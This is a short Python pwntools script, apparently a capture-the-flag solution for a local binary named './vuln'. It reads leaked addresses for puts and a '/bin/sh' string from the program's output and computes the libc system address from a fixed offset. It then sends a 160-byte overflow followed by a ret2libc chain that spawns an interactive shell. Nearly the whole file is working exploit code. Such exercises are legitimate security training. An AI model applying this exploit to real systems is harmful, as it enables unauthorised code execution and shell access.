#!/usr/bin/python3

# the ./vuln give diferents address and we have to find system addr in libc
# they give us a usefull string '/bin/sh'

# think to put an absolute path to the program
# think to create a sym link to the flag.txt

import pwn
import re

addr_puts = 0xf7e46360
addr_system = 0xf7e1bd10

addr_delta = addr_puts - addr_system

elf = pwn.ELF('./vuln') 
p = elf.process()

prompt = p.recv().decode()

addr_puts = int(re.findall('puts: (.*)', prompt)[0],16)
addr_god_string = int(re.findall('useful_string: (.*)', prompt)[0], 16)

addr_system = addr_puts - addr_delta

payload = b'A'*160

print('system -> ', type(addr_system))
payload += pwn.p32(addr_system)
payload += b'RETN'
payload += pwn.p32(addr_god_string)

p.sendline(payload)

p.interactive()

